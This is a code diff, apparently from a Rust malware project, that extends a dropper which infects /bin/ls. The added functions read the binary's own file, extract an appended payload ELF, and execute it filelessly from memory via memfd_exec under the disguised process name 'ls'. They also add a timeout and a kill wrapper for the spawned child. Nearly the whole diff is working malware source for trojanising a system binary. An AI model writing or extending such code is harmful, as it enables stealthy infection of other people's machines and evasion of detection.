@@ -1,9 +1,15 @@
 use clap::Parser;
-use memfd_exec::MemFdExecutable;
+use memfd_exec::{Child, MemFdExecutable, Stdio, AnonPipe};
 use std::env::{self, args, current_exe, vars};
+use std::ffi::OsStr;
+use std::os::fd::FromRawFd;
 use std::fs::{File, read};
 use std::io::{Read, Write};
+use std::os::fd::IntoRawFd;
 use std::os::unix::fs::PermissionsExt;
+use std::time::{Duration, Instant};
+use std::thread::sleep;
+use std::fs::OpenOptions;
 
 #[derive(Parser, Debug)]
 struct Args {
@@ -22,6 +28,7 @@ const DROPPER_TAG : [u8 ; 1] = [137];
 const INFECT_TAG  : [u8 ; 1] = [67];
 const SL_TARGET : &str = "/bin/ls";
 const SL_OUTPUT_BINARY_NAME : &str = "ls";
+const DROPPER_TIMEOUT : Duration = Duration::from_secs(30);
 
 pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
@@ -76,8 +83,7 @@ pub fn drop_payload() -> Result<(), Box<dyn std::error::Error>> {
         let _ = drop_target_elf_to_path(decoy_path, output_path);
     }
 
-    spawn_infected_program()
-
+    spawn_dropper_program()
 }
 
 pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
@@ -93,13 +99,69 @@ pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
 
     let argv: Vec<String> = args().collect();
     let env: Vec<(String, String)> = vars().collect();
-    let _ = MemFdExecutable::new(&argv[0], executable)
+    let mut exec = MemFdExecutable::new(&argv[0], executable);
+    let stdout_file = OpenOptions::new().read(false).write(true).open("/dev/tty")?;
+
+    unsafe {
+        let stdout = AnonPipe::from_raw_fd(stdout_file.into_raw_fd());
+        exec
+            .envs(env)
+            .args(&argv[1..])
+            .stdout(Stdio::from(stdout))
+            .set_program(OsStr::new(SL_OUTPUT_BINARY_NAME));
+        let _child : Child = exec.spawn()?;
+    }
+    Ok(())
+}
+// IMPLEMENT FROM_RAW_FD FOR ChildStdout, should be a simple implementation from AnonPipe and up.
+pub fn spawn_dropper_program() -> Result<(), Box<dyn std::error::Error>> {
+    let own_path = current_exe()?;
+    let own_contents: Vec<u8> = read(own_path)?;
+
+    let binary_size = own_contents.len();
+    let payload_length_offset = binary_size - 8;
+    let payload_length = usize::from_le_bytes(own_contents[payload_length_offset..].try_into()?);
+    let real_binary_start = payload_length;
+    let real_binary_end = payload_length_offset;
+    let executable = &own_contents[real_binary_start..real_binary_end];
+
+    let argv: Vec<String> = args().collect();
+    let env: Vec<(String, String)> = vars().collect();
+    let mut exec = MemFdExecutable::new(&argv[0], executable);
+    exec
         .envs(env)
         .args(&argv[1..])
-        .spawn();
+        .stdout(Stdio::inherit())
+        .set_program(OsStr::new(SL_OUTPUT_BINARY_NAME));
+
+    let child : Child = exec.spawn()?;
+    let mut child_container = ChildContainer { child };
+    let child = &mut child_container.child;
+
+    let start_time = Instant::now();
+    while child.try_wait()?.is_none() {
+        if Instant::now().duration_since(start_time) > DROPPER_TIMEOUT {
+            break
+        }
+        sleep(Duration::from_millis(10));
+    }
+
     Ok(())
 }
 
+struct ChildContainer {
+    child : Child 
+}
+impl Drop for ChildContainer {
+    fn drop(&mut self) {
+        while self.child.kill().is_err() {
+            if let Ok(Some(_exit_code)) = self.child.try_wait() {
+                return 
+            }
+            sleep(Duration::from_secs(1));
+        }
+    }
+}
 pub fn get_own_infection_status() -> InfectionStatus {
     let own_path = current_exe().expect("Failed to find my own path...");
     let own_contents = read(&own_path).expect("Failed to open myself...");
